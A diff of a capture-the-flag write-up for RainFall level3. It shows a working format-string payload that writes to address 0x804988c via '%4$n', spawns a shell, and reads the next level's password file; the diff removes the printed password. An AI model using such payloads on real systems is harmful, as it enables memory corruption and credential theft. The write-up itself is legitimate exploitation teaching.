@@ -60,12 +60,26 @@ Wait what?!
 We won! we just need to find a way to keep the shell open now.
 
 ## Putting it together
-Sadly `struct.pack()` doesn't really work to send our data to stdin in time, instead we've got to write `0x804988c` in little-endian manually.
+struct.pack adds extra padding as we can see with hexdump:
+```shell
+level3@RainFall:~$ python -c 'import struct; print struct.pack("<Q", 0x804988c) + "a"*60 + "%4$n"' | hexdump -C
+00000000  8c 98 04 08 00 00 00 00  61 61 61 61 61 61 61 61  |........aaaaaaaa|
+00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
+*
+00000040  61 61 61 61 25 34 24 6e  0a                       |aaaa%4$n.|
+00000049
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' | hexdump -C
+00000000  8c 98 04 08 61 61 61 61  61 61 61 61 61 61 61 61  |....aaaaaaaaaaaa|
+00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
+*
+00000040  25 34 24 6e 0a                                    |%4$n.|
+00000045
+```
+So let's write `0x804988c` in little-endian manually.
 
 ```shell
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' ; cat -) | ./level3
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Wait what?!
 cat /home/user/level4/.pass
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
